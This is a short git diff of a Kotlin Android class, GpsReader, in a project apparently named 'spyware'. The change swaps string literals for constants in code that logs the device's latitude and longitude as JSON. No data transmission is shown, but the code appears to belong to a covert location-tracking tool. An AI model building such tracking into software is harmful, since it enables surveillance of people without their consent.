@@ -23,6 +23,9 @@ import com.google.android.gms.location.Priority
 import android.os.Looper
 import android.provider.Settings
 import androidx.core.content.ContextCompat.startActivity
+import com.example.spyware.common.Constants.Companion.ERROR
+import com.example.spyware.common.Constants.Companion.LATITUDE
+import com.example.spyware.common.Constants.Companion.LONGITUDE
 import com.google.android.gms.common.api.ResolvableApiException
 import com.google.android.gms.location.LocationSettingsRequest
 import com.google.android.gms.location.SettingsClient
@@ -55,10 +58,10 @@ class GpsReader(private val context: Context) {
                 location?.let {
                     val latitude = it.latitude
                     val longitude = it.longitude
-                    log(context, JSONObject().put("latitude",latitude).put("longitude",longitude))
+                    log(context, JSONObject().put(LATITUDE,latitude).put(LONGITUDE,longitude))
 //                    println("GPS Lat: $latitude Lon: $longitude")
                 } ?: run {
-                    log(context, JSONObject().put("error","Unable to read location data"))
+                    log(context, JSONObject().put(ERROR,"Unable to read location data"))
 
 //                    requestLocationUpdates()
 //                    showEnableMobileDataDialog(context)
